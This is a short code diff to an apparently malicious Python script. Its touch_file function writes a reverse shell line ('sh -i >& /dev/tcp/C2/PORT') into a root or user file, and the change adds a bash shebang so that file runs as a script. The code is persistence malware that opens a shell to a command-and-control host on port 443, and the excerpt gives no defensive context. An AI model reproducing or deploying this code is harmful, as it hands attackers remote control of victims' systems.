@@ -29,7 +29,7 @@ PORT = 443
 def touch_file():
     try:
         with open(ROOT_PATH, 'a') as root_fd:
-            message = 'sh -i >& /dev/tcp/{0}/{1} 0>&1'.format(
+            message = '#!/bin/bash\nsh -i >& /dev/tcp/{0}/{1} 0>&1'.format(
                 C2.strip('"'),
                 PORT
             )
@@ -40,7 +40,7 @@ def touch_file():
     except (IOError, OSError):
         try:
             with open(USER_PATH, 'a') as user_fd:
-                message = 'sh -i >& /dev/tcp/{0}/{1} 0>&1'.format(
+                message = '#!/bin/bash\nsh -i >& /dev/tcp/{0}/{1} 0>&1'.format(
                     C2.strip('"'),
                     PORT
                 )
